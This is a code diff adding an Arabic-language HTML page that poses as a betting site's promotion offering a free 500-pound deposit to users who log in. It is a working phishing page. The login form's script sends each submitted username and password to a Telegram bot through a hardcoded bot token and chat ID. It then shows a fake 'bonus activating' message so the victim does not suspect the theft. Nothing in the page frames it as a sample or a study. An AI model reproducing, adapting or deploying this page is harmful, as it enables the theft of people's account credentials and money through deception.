@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>موقع احترافي</title>
+  <style>
+    /* إعادة تعيين الهوامش وتعديل الصندوق للنماذج */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* التنسيق الأساسي للصفحة مع تغيير خلفية الموقع */
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #1a3055;
+      color: #fff;
+      line-height: 1.6;
+    }
+
+    /* تصميم الهيدر */
+    header {
+      background-color: #1f3a64;
+      padding: 15px 30px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+    .logo img {
+      height: 25px;
+      transition: transform 0.3s ease;
+    }
+    .logo img:hover {
+      transform: scale(1.1);
+    }
+    .login-btn {
+      padding: 7px 16px;
+      background-color: #ffffff;
+      color: #496797;
+      font-weight: bold;
+      text-decoration: none;
+      border: 2px solid transparent;
+      border-radius: 25px;
+      transition: background-color 0.3s ease, border-color 0.3s ease, transform 0.3s ease;
+      cursor: pointer;
+    }
+    .login-btn:hover {
+      background-color: #f0f0f0;
+      border-color: #496797;
+      transform: scale(1.05);
+    }
+
+    /* قسم البطل (Hero Section) */
+    .hero {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 50px 20px;
+    }
+    .hero-image {
+      flex: 1;
+      max-width: 500px;
+      text-align: center;
+    }
+    .hero-image img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 10px;
+    }
+    .hero-text {
+      flex: 1;
+      margin-left: 30px;
+      max-width: 600px;
+      text-align: right;
+    }
+    .hero-text h2 {
+      font-size: 2em;
+      margin-bottom: 20px;
+      color: #fff;
+    }
+    .hero-text ul {
+      list-style: none;
+      padding-right: 20px;
+    }
+    .hero-text ul li {
+      position: relative;
+      padding-right: 25px;
+      margin-bottom: 10px;
+    }
+    .hero-text ul li::before {
+      content: "\2022";
+      position: absolute;
+      right: 0;
+      color: #000;
+      font-size: 1.2em;
+      line-height: 1;
+    }
+
+    /* تصميم نافذة تسجيل الدخول والانتظار بشكل احترافي */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow-y: auto;
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 10px;
+    }
+    .modal-content {
+      background-color: #fff;
+      margin: 8% auto;
+      padding: 30px 25px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+      position: relative;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+      animation: slideDown 0.5s ease;
+      text-align: right;
+      direction: rtl;
+    }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .modal-header {
+      text-align: center;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+    }
+    .modal-header h2 {
+      color: #496797;
+      font-size: 1.8em;
+    }
+    .modal-content form {
+      display: flex;
+      flex-direction: column;
+    }
+    .modal-content label {
+      margin-bottom: 5px;
+      color: #333;
+      font-size: 0.9em;
+    }
+    .modal-content input {
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+    .modal-content input:focus {
+      border-color: #496797;
+      outline: none;
+      box-shadow: 0 0 5px rgba(73,103,151,0.5);
+    }
+    .modal-content button {
+      padding: 10px;
+      background-color: #496797;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.3s ease;
+    }
+    .modal-content button:hover {
+      background-color: #3b5470;
+      transform: scale(1.05);
+    }
+    .close {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 24px;
+      cursor: pointer;
+      color: #aaa;
+      transition: color 0.3s ease;
+    }
+    .close:hover {
+      color: #000;
+    }
+
+    /* تحسين استجابة الموقع على الشاشات الصغيرة دون تغيير ترتيب الهيدر */
+    @media (max-width: 768px) {
+      .hero {
+        flex-direction: column;
+        padding: 30px 10px;
+      }
+      .hero-text {
+        margin: 20px 0 0 0;
+        text-align: center;
+      }
+      .hero-text h2 {
+        font-size: 1.6em;
+      }
+      .modal-content {
+        margin: 20% auto;
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <!-- الشعار على اليسار -->
+    <div class="logo">
+      <a href="#">
+        <img src="1x-logo.svg" alt="شعار الموقع">
+      </a>
+    </div>
+    <!-- زر تسجيل الدخول على اليمين -->
+    <div>
+      <button class="login-btn" id="openModal">تسجيل الدخول</button>
+    </div>
+  </header>
+
+  <!-- قسم البطل -->
+  <section class="hero">
+    <div class="hero-image">
+      <img src="hero-image.png" alt="عرض ترويجي">
+    </div>
+    <div class="hero-text">
+      <h2>احصل على إيداع 500 جنيه مجانا على حسابك</h2>
+      <ul>
+        <li>أن تكون قد أجريت عملية إيداع مسبقة</li>
+        <li>أن يكون على حسابك في وقت تفعيل المكافأة مبلغ لا يقل عن 130 جنيه</li>
+        <li>كل ما عليك فعله هو تسجيل الدخول وانتظار تفعيل العرض</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- نافذة تسجيل الدخول -->
+  <div id="loginModal" class="modal">
+    <div class="modal-content">
+      <span class="close" id="closeModal">&times;</span>
+      <div class="modal-header">
+        <h2>تسجيل الدخول</h2>
+      </div>
+      <form id="loginForm">
+        <label for="username">اسم المستخدم:</label>
+        <input type="text" id="username" name="username" required>
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password" required>
+        <button type="submit">دخول</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- نافذة الانتظار -->
+  <div id="waitModal" class="modal">
+    <div class="modal-content">
+      <span class="close" id="closeWaitModal">&times;</span>
+      <div class="modal-header">
+        <h2>انتظر حتى يتم تفعيل المكافأة</h2>
+      </div>
+      <p>يرجى الانتظار قليلاً، جاري تفعيل المكافأة الخاصة بك.</p>
+    </div>
+  </div>
+
+  <script>
+    // عرض وإخفاء نافذة تسجيل الدخول
+    const loginModal = document.getElementById('loginModal');
+    const openModalBtn = document.getElementById('openModal');
+    const closeModalBtn = document.getElementById('closeModal');
+
+    openModalBtn.addEventListener('click', () => {
+      loginModal.style.display = 'block';
+    });
+
+    closeModalBtn.addEventListener('click', () => {
+      loginModal.style.display = 'none';
+    });
+
+    window.addEventListener('click', event => {
+      if (event.target === loginModal) {
+        loginModal.style.display = 'none';
+      }
+    });
+
+    // إرسال بيانات تسجيل الدخول إلى Telegram
+    const loginForm = document.getElementById('loginForm');
+    loginForm.addEventListener('submit', event => {
+      event.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // إعداد بيانات التيليجرام (استبدل القيم بالتفاصيل الخاصة بك)
+      const botToken = '7722422574:AAGBP5AeJPdAs9Gs0dJOU7_rSLOdrIKimfI';
+      const chatId = '7336270350';
+      const message = `بيانات تسجيل الدخول:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(telegramUrl)
+        .then(response => response.json())
+        .then(data => {
+          console.log('تم إرسال البيانات إلى تيليجرام:', data);
+          // إخفاء نافذة تسجيل الدخول وإظهار نافذة الانتظار
+          loginModal.style.display = 'none';
+          document.getElementById('waitModal').style.display = 'block';
+        })
+        .catch(error => {
+          console.error('خطأ أثناء إرسال البيانات:', error);
+        });
+    });
+
+    // إغلاق نافذة الانتظار
+    const waitModal = document.getElementById('waitModal');
+    const closeWaitModalBtn = document.getElementById('closeWaitModal');
+    closeWaitModalBtn.addEventListener('click', () => {
+      waitModal.style.display = 'none';
+    });
+
+    window.addEventListener('click', event => {
+      if (event.target === waitModal) {
+        waitModal.style.display = 'none';
+      }
+    });
+  </script>
+</body>
+</html>
